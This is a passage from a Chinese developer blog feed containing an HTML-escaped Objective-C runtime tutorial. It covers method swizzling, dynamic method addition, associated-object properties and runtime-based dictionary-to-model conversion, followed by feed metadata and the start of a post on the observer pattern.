&lt;ul&gt;&lt;li&gt;开发使用场景:系统自带的方法功能不够，&lt;span&gt;给系统自带的方法扩展一些功能，并且保持原有的功能&lt;/span&gt;。&lt;/li&gt;
&lt;li&gt;方式一:继承系统的类，重写方法.&lt;/li&gt;
&lt;li&gt;方式二:使用runtime,交换方法.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; ViewController


&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)viewDidLoad {
    [super viewDidLoad];
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Do any additional setup after loading the view, typically from a nib.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 需求：给imageNamed方法提供功能，每次加载图片就判断下图片是否加载成功。
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 步骤一：先搞个分类，定义一个能加载图片并且能打印的方法+ (instancetype)imageWithName:(NSString *)name;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 步骤二：交换imageNamed和imageWithName的实现，就能调用imageWithName，间接调用imageWithName的实现。&lt;/span&gt;
    UIImage *image = [UIImage imageNamed:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];

}

&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;


&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; UIImage (Image)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 加载分类到内存的时候调用&lt;/span&gt;
+ (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)load
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 交换方法

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取imageWithName方法地址&lt;/span&gt;
    Method imageWithName =&lt;span&gt; class_getClassMethod(self, @selector(imageWithName:));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取imageWithName方法地址&lt;/span&gt;
    Method imageName =&lt;span&gt; class_getClassMethod(self, @selector(imageNamed:));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 交换方法地址，相当于交换实现方式&lt;/span&gt;
&lt;span&gt;    method_exchangeImplementations(imageWithName, imageName);


}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不能在分类中重写系统方法imageNamed，因为会把系统的功能给覆盖掉，而且分类中不能调用super.

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 既能加载图片又能打印&lt;/span&gt;
+ (instancetype)imageWithName:(NSString *&lt;span&gt;)name
{

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这里调用imageWithName，相当于调用imageName&lt;/span&gt;
    UIImage *image =&lt;span&gt; [self imageWithName:name];

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (image ==&lt;span&gt; nil) {
        NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;加载空的图片&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; image;
}


&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;&lt;li&gt;交换原理：
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;交换之前： &lt;img src=&quot;file:///Users/jukai/Downloads/课堂笔记/RunTime/Snip20151013_2.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换之后： &lt;img src=&quot;file:///Users/jukai/Downloads/课堂笔记/RunTime/Snip20151013_3.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4&gt;3.动态添加方法&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;开发使用场景：如果一个类方法非常多，加载类到内存的时候也比较耗费资源，需要给每个方法生成映射表，可以使用动态给某个类，添加方法解决。&lt;/li&gt;
&lt;li&gt;经典面试题：有没有使用performSelector，其实主要想问你有没有动态添加过方法。&lt;/li&gt;
&lt;li&gt;简单使用&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; ViewController

&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)viewDidLoad {
    [super viewDidLoad];
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Do any additional setup after loading the view, typically from a nib.&lt;/span&gt;
&lt;span&gt;
    Person &lt;/span&gt;*p =&lt;span&gt; [[Person alloc] init];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认person，没有实现eat方法，可以通过performSelector调用，但是会报错。
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 动态添加方法就不会报错&lt;/span&gt;
&lt;span&gt;    [p performSelector:@selector(eat)];

}


&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;


&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; Person
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; void(*)()
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认方法都有两个隐式参数，&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; eat(&lt;span&gt;id&lt;/span&gt;&lt;span&gt; self,SEL sel)
{
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;%@ %@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,self,NSStringFromSelector(sel));
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当一个对象调用未实现的方法，会调用这个方法处理,并且会把对应的方法列表传过来.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 刚好可以用来判断，未实现的方法是不是我们想要动态添加的方法&lt;/span&gt;
+&lt;span&gt; (BOOL)resolveInstanceMethod:(SEL)sel
{

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (sel ==&lt;span&gt; @selector(eat)) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 动态添加eat方法

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第一个参数：给哪个类添加方法
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第二个参数：添加方法的方法编号
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第三个参数：添加方法的函数实现（函数地址）
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第四个参数：函数的类型，(返回值+参数类型) v:void @:对象-&amp;gt;self :表示SEL-&amp;gt;_cmd&lt;/span&gt;
        class_addMethod(self, @selector(eat), eat, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v@:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; [super resolveInstanceMethod:sel];
}
&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h4&gt;4.给分类添加属性&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;原理：&lt;span&gt;给一个类声明属性，其实本质就是给这个类添加关联，并不是直接把这个值的内存空间添加到类存空间&lt;/span&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; ViewController

&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)viewDidLoad {
    [super viewDidLoad];
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Do any additional setup after loading the view, typically from a nib.

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 给系统NSObject类动态添加属性name&lt;/span&gt;
&lt;span&gt;
    NSObject &lt;/span&gt;*objc =&lt;span&gt; [[NSObject alloc] init];
    objc.name &lt;/span&gt;= &lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;小码哥&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    NSLog(&lt;/span&gt;&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,objc.name);

}


&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;


&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义关联的key&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; *key = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; NSObject (Property)

&lt;/span&gt;- (NSString *&lt;span&gt;)name
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据关联的key，获取关联的值。&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt;&lt;span&gt; objc_getAssociatedObject(self, key);
}

&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;)setName:(NSString *&lt;span&gt;)name
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第一个参数：给哪个对象添加关联
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第二个参数：关联的key，通过这个key获取
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第三个参数：关联的value
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第四个参数:关联的策略&lt;/span&gt;
&lt;span&gt;    objc_setAssociatedObject(self, key, name, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}

&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h4&gt;5.字典转模型&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;设计模型：字典转模型的第一步
&lt;ul&gt;&lt;li&gt;模型属性，通常需要跟字典中的key一一对应&lt;/li&gt;
&lt;li&gt;问题：一个一个的生成模型属性，很慢？&lt;/li&gt;
&lt;li&gt;需求：能不能自动根据一个字典，生成对应的属性。&lt;/li&gt;
&lt;li&gt;解决：提供一个分类，专门根据字典生成对应的属性字符串。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; NSObject (Log)


&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 自动打印属性字符串&lt;/span&gt;
+ (&lt;span&gt;void&lt;/span&gt;)resolveDict:(NSDictionary *&lt;span&gt;)dict{

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 拼接属性字符串代码&lt;/span&gt;
    NSMutableString *strM = [NSMutableString &lt;span&gt;string&lt;/span&gt;&lt;span&gt;];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1.遍历字典，把字典中的所有key取出来，生成对应的属性代码&lt;/span&gt;
    [dict enumerateKeysAndObjectsUsingBlock:^(&lt;span&gt;id&lt;/span&gt;  _Nonnull key, &lt;span&gt;id&lt;/span&gt;  _Nonnull obj, BOOL *&lt;span&gt; _Nonnull stop) {

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 类型经常变，抽出来&lt;/span&gt;
         NSString *&lt;span&gt;type;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ([obj isKindOfClass:NSClassFromString(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;__NSCFString&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]) {
            type &lt;/span&gt;= &lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;NSString&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; ([obj isKindOfClass:NSClassFromString(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;__NSCFArray&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]){
            type &lt;/span&gt;= &lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;NSArray&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; ([obj isKindOfClass:NSClassFromString(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;__NSCFNumber&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]){
            type &lt;/span&gt;= &lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; ([obj isKindOfClass:NSClassFromString(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;__NSCFDictionary&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]){
            type &lt;/span&gt;= &lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;NSDictionary&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }


        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 属性字符串&lt;/span&gt;
        NSString *&lt;span&gt;str;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ([type containsString:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;NS&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;]) {
            str &lt;/span&gt;= [NSString stringWithFormat:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;@property (nonatomic, strong) %@ *%@;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,type,key];
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            str &lt;/span&gt;= [NSString stringWithFormat:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;@property (nonatomic, assign) %@ %@;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,type,key];
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 每生成属性字符串，就自动换行。&lt;/span&gt;
        [strM appendFormat:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;\n%@\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,str];

    }];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把拼接好的字符串打印出来，就好了。&lt;/span&gt;
    NSLog(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;%@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,strM);

}


&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;&lt;li&gt;字典转模型的方式一：KVC&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; Status


&lt;/span&gt;+ (instancetype)statusWithDict:(NSDictionary *&lt;span&gt;)dict
{
    Status &lt;/span&gt;*status =&lt;span&gt; [[self alloc] init];

    [status setValuesForKeysWithDictionary:dict];

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; status;

}

&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;&lt;li&gt;KVC字典转模型弊端：必须保证，模型中的属性和字典中的key一一对应。
&lt;ul&gt;&lt;li&gt;如果不一致，就会调用&lt;code&gt;[&amp;lt;Status 0x7fa74b545d60&amp;gt; setValue:forUndefinedKey:]&lt;/code&gt; 报&lt;code&gt;key&lt;/code&gt;找不到的错。&lt;/li&gt;
&lt;li&gt;分析:模型中的属性和字典的key不一一对应，系统就会调用&lt;code&gt;setValue:forUndefinedKey:&lt;/code&gt;报错。&lt;/li&gt;
&lt;li&gt;解决:重写对象的&lt;code&gt;setValue:forUndefinedKey:&lt;/code&gt;,把系统的方法覆盖， 就能继续使用KVC，字典转模型了。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
- (&lt;span&gt;void&lt;/span&gt;)setValue:(&lt;span&gt;id&lt;/span&gt;)value forUndefinedKey:(NSString *&lt;span&gt;)key
{

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;&lt;li&gt;字典转模型的方式二：Runtime
&lt;ul&gt;&lt;li&gt;思路：利用运行时，遍历模型中所有属性，根据模型的属性名，去字典中查找key，取出对应的值，给模型的属性赋值。&lt;/li&gt;
&lt;li&gt;步骤：提供一个NSObject分类，专门字典转模型，以后所有模型都可以通过这个分类转。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; ViewController

&lt;/span&gt;- (&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)viewDidLoad {
    [super viewDidLoad];
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Do any additional setup after loading the view, typically from a nib.

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 解析Plist文件&lt;/span&gt;
    NSString *filePath = [[NSBundle mainBundle] pathForResource:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;status.plist&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; ofType:nil];

    NSDictionary &lt;/span&gt;*statusDict =&lt;span&gt; [NSDictionary dictionaryWithContentsOfFile:filePath];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取字典数组&lt;/span&gt;
    NSArray *dictArr = statusDict[&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;statuses&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 自动生成模型的属性字符串
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    [NSObject resolveDict:dictArr[0][@&quot;user&quot;]];&lt;/span&gt;
&lt;span&gt;

    _statuses &lt;/span&gt;=&lt;span&gt; [NSMutableArray array];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 遍历字典数组&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (NSDictionary *dict &lt;span&gt;in&lt;/span&gt;&lt;span&gt; dictArr) {

        Status &lt;/span&gt;*status =&lt;span&gt; [Status modelWithDict:dict];

        [_statuses addObject:status];

    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 测试数据&lt;/span&gt;
    NSLog(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;%@ %@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,_statuses,[_statuses[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] user]);


}

&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;

&lt;span&gt;@implementation&lt;/span&gt;&lt;span&gt; NSObject (Model)

&lt;/span&gt;+ (instancetype)modelWithDict:(NSDictionary *&lt;span&gt;)dict
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 思路：遍历模型中所有属性-》使用运行时

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 0.创建对应的对象&lt;/span&gt;
    &lt;span&gt;id&lt;/span&gt; objc =&lt;span&gt; [[self alloc] init];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1.利用runtime给对象中的成员属性赋值

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; class_copyIvarList:获取类中的所有成员属性
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Ivar：成员属性的意思
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第一个参数：表示获取哪个类中的成员属性
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第二个参数：表示这个类有多少成员属性，传入一个Int变量地址，会自动给这个变量赋值
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回值Ivar *：指的是一个ivar数组，会把所有成员属性放在一个数组中，通过返回的数组就能全部获取到。&lt;/span&gt;
    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; 类似下面这种写法

     Ivar ivar;
     Ivar ivar1;
     Ivar ivar2;
     // 定义一个ivar的数组a
     Ivar a[] = {ivar,ivar1,ivar2};

     // 用一个Ivar *指针指向数组第一个元素
     Ivar *ivarList = a;

     // 根据指针访问数组第一个元素
     ivarList[0];

     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; count;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取类中的所有成员属性&lt;/span&gt;
    Ivar *ivarList = class_copyIvarList(self, &amp;amp;&lt;span&gt;count);

    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; count; i++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据角标，从数组取出对应的成员属性&lt;/span&gt;
        Ivar ivar =&lt;span&gt; ivarList[i];

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取成员属性名&lt;/span&gt;
        NSString *name =&lt;span&gt; [NSString stringWithUTF8String:ivar_getName(ivar)];

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 处理成员属性名-&amp;gt;字典中的key
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从第一个角标开始截取&lt;/span&gt;
        NSString *key = [name substringFromIndex:&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据成员属性名去字典中查找对应的value&lt;/span&gt;
        &lt;span&gt;id&lt;/span&gt; value =&lt;span&gt; dict[key];

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 二级转换:如果字典中还有字典，也需要把对应的字典转换成模型
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断下value是否是字典&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ([value isKindOfClass:[NSDictionary &lt;span&gt;class&lt;/span&gt;&lt;span&gt;]]) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 字典转模型
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取模型的类对象，调用modelWithDict
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 模型的类名已知，就是成员属性的类型

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取成员属性类型&lt;/span&gt;
           NSString *type =&lt;span&gt; [NSString stringWithUTF8String:ivar_getTypeEncoding(ivar)];
          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 生成的是这种@&quot;@\&quot;User\&quot;&quot; 类型 -》 @&quot;User&quot;  在OC字符串中 \&quot; -&amp;gt; &quot;，\是转义的意思，不占用字符
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 裁剪类型字符串&lt;/span&gt;
            NSRange range = [type rangeOfString:&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;\&quot;&quot;];

           type = [type substringFromIndex:range.location + range.length];

            range = [type rangeOfString:@&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;\&lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;];

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 裁剪到哪个角标，不包括当前角标&lt;/span&gt;
          type =&lt;span&gt; [type substringToIndex:range.location];


            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据字符串类名生成类对象&lt;/span&gt;
            Class modelClass =&lt;span&gt; NSClassFromString(type);


            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (modelClass) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 有对应的模型才需要转

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把字典转模型&lt;/span&gt;
                value  =&lt;span&gt;  [modelClass modelWithDict:value];
            }


        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 三级转换：NSArray中也是字典，把数组中的字典转换成模型.
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断值是否是数组&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ([value isKindOfClass:[NSArray &lt;span&gt;class&lt;/span&gt;&lt;span&gt;]]) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断对应类有没有实现字典数组转模型数组的协议&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; ([self respondsToSelector:@selector(arrayContainModelClass)]) {

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 转换成id类型，就能调用任何对象的方法&lt;/span&gt;
                &lt;span&gt;id&lt;/span&gt; idSelf =&lt;span&gt; self;

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取数组中字典对应的模型&lt;/span&gt;
                NSString *type =&lt;span&gt;  [idSelf arrayContainModelClass][key];

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 生成模型&lt;/span&gt;
               Class classModel =&lt;span&gt; NSClassFromString(type);
                NSMutableArray &lt;/span&gt;*arrM =&lt;span&gt; [NSMutableArray array];
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 遍历字典数组，生成模型数组&lt;/span&gt;
                &lt;span&gt;for&lt;/span&gt; (NSDictionary *dict &lt;span&gt;in&lt;/span&gt;&lt;span&gt; value) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 字典转模型&lt;/span&gt;
                  &lt;span&gt;id&lt;/span&gt; model =&lt;span&gt;  [classModel modelWithDict:dict];
                    [arrM addObject:model];
                }

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把模型数组赋值给value&lt;/span&gt;
                value =&lt;span&gt; arrM;

            }
        }


        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 有值，才需要给模型的属性赋值
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 利用KVC给模型中的属性赋值&lt;/span&gt;
&lt;span&gt;            [objc setValue:value forKey:key];
        }

    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; objc;
}

&lt;/span&gt;&lt;span&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;pre&gt;
&lt;code&gt; &lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sat, 24 Mar 2018 07:15:00 +0000</pubDate>
<dc:creator>鸿鹄当高远</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jukaiit/p/5242211.html</dc:identifier>
</item>
<item>
<title>设计模式-观察者模式 - 武培轩</title>
<link>http://www.cnblogs.com/wupeixuan/p/8638395.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wupeixuan/p/8638395.html</guid>
<description>&lt;h2 id=&quot;模式定义&quot;&gt;模式定义&lt;/h2&gt;
